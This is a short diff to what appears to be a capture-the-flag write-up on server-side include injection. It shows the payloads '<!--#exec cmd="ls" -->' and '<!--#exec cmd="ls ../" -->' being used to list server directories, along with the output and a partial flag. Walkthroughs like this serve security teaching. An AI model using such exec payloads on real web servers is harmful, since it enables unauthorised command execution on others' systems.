@@ -44,7 +44,8 @@ However, Sam's young daughter Stephanie has just learned to program in PHP. She'
 req: SSI
 metd: SSI
 
-So the simple command that does that is <!--#exec cmd="ls" --> 
+So the simple command that does that is <!--#exec cmd="ls" --> Basically, the instruction for server is to execute the ls command.
+
 Which gives us a directory listing of inside the /tmp/ directory. To proceed one level up, simply <!--#exec cmd="ls ../" --> ls one directory up
 
 Output: au12ha39vc.php index.php level8.php tmp! Check the file via browser: 569c6328
